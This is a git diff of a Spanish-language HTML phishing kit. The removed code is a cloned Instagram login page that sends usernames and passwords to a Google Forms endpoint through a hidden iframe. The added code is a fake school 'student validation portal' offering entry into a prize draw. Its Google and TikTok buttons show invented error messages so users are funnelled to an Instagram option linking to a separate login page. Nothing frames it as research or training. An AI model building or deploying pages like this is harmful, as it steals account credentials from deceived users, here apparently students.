@@ -3,58 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión • Instagram</title>
+    <title>Portal de Validación Estudiantil</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { display:flex; justify-content:center; align-items:center; height:100vh; background-color:#fafafa; }
-        .login-box { background:white; padding:25px; border:1px solid #dbdbdb; text-align:center; width:350px; }
-        .logo { width:175px; margin-bottom:20px; cursor:default; }
-        .field { position:relative; width:100%; margin-top:10px; }
-        .field input { width:100%; padding:10px; border:1px solid #dbdbdb; border-radius:3px; font-size:12px; background:#fafafa; outline:none; }
-        .field label { position:absolute; top:50%; left:10px; transform:translateY(-50%); font-size:12px; color:#8e8e8e; pointer-events:none; transition: all 0.1s ease; }
-        .field input:focus + label, .field input:not(:placeholder-shown) + label { top:7px; font-size:10px; }
-        .btn { width:100%; padding:8px; background-color:#0095f6; color:white; border:none; border-radius:4px; cursor:pointer; font-size:14px; margin-top:15px; font-weight:600; }
-        #loading { display: none; margin-top: 20px; font-size: 14px; color: #262626; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .portal-card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
+        .insti-logo { width: 80px; margin-bottom: 20px; opacity: 0.8; }
+        h1 { font-size: 20px; color: #1c1e21; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606770; margin-bottom: 30px; line-height: 1.5; }
+        .auth-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 6px; cursor: pointer; font-weight: 600; transition: 0.3s; text-decoration: none; font-size: 14px; }
+        .google { color: #555; background: #fff; }
+        .tiktok { color: #fff; background: #000; }
+        .instagram { color: #fff; background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); border: none; }
+        .auth-btn:hover { opacity: 0.8; transform: translateY(-1px); }
+        .error-msg { display: none; color: #d93025; font-size: 12px; margin-top: -8px; margin-bottom: 10px; text-align: left; padding-left: 5px; }
     </style>
 </head>
 <body>
 
-<div class="login-box" id="mainBox">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-    
-    <form id="authForm" action="https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse" method="POST" target="hidden_iframe">
-        <div class="field">
-            <input type="text" name="entry.1271603301" id="u_name" placeholder=" " required>
-            <label>Usuario o correo electrónico</label>
-        </div>
-        <div class="field">
-            <input type="password" name="entry.1257754249" id="u_pass" placeholder=" " required>
-            <label>Contraseña</label>
-        </div>
-        <button type="submit" class="btn">Confirmar para Encuesta</button>
-    </form>
-    
-    <div id="loading">Verificando cuenta...</div>
+<div class="portal-card">
+    <img src="https://cdn-icons-png.flaticon.com/512/2602/2602414.png" class="insti-logo">
+    <h1>Validación de Encuesta</h1>
+    <p>Para registrar tu participación en el <b>Estudio de Convivencia Escolar 2026</b> y entrar en el sorteo, selecciona un método de verificación:</p>
+
+    <div class="auth-btn google" onclick="showError('g')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" style="width:18px; margin-right:10px;"> Continuar con Google
+    </div>
+    <div id="err-g" class="error-msg">Error: Servidor de Google no disponible para este centro.</div>
+
+    <div class="auth-btn tiktok" onclick="showError('t')">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" style="width:18px; margin-right:10px; filter: invert(1);"> Continuar con TikTok
+    </div>
+    <div id="err-t" class="error-msg">Error: API de TikTok bloqueada por la red escolar.</div>
+
+    <a href="login-panel.html" class="auth-btn instagram">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" style="width:18px; margin-right:10px; filter: brightness(0) invert(1);"> Continuar con Instagram
+    </a>
+
+    <div style="margin-top: 25px; font-size: 11px; color: #999;">
+        &copy; 2026 Departamento de Innovación Educativa
+    </div>
 </div>
 
-<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-
 <script>
-    const form = document.getElementById('authForm');
-    const box = document.getElementById('mainBox');
-    const loader = document.getElementById('loading');
-
-    form.addEventListener('submit', function() {
-        // 1. Ocultamos el formulario y mostramos el cargando
-        form.style.display = 'none';
-        loader.style.display = 'block';
-
-        // 2. Esperamos un poco para que el Form reciba los datos y redirigimos
-        setTimeout(function() {
-            // CAMBIA ESTA URL POR TU ENCUESTA REAL DE GOOGLE
-            window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSdZLcXgQAaXUYVUZvJ2TN59Qxks5NxEKG8N6-BJ3cXhxd9l7A/viewform?usp=publish-editor";
-        }, 1500);
-    });
+    function showError(id) {
+        document.getElementById('err-' + id).style.display = 'block';
+    }
 </script>
 
 </body>
